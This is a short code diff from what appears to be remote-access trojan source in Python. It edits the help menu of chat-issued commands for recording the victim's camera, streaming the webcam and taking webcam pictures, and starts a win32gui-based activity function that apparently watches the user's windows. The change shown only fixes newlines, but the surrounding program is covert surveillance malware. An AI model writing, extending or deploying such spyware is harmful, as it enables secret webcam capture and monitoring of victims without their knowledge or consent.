@@ -97,8 +97,8 @@ Availaible commands are :
 """
 if not (sys.argv[0].endswith("exe")):
     helpmenu+='--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"'
-    helpmenu+='--> !streamwebcam = streams webcam by sending multiple pictures\n--> !stopwebcam = stop webcam stream'
-    helpmenu+='--> !webcampic = Take a picture from the webcam'
+    helpmenu+='\n--> !streamwebcam = streams webcam by sending multiple pictures\n--> !stopwebcam = stop webcam stream'
+    helpmenu+='\n--> !webcampic = Take a picture from the webcam'
 async def activity(client):
     import time
     import win32gui
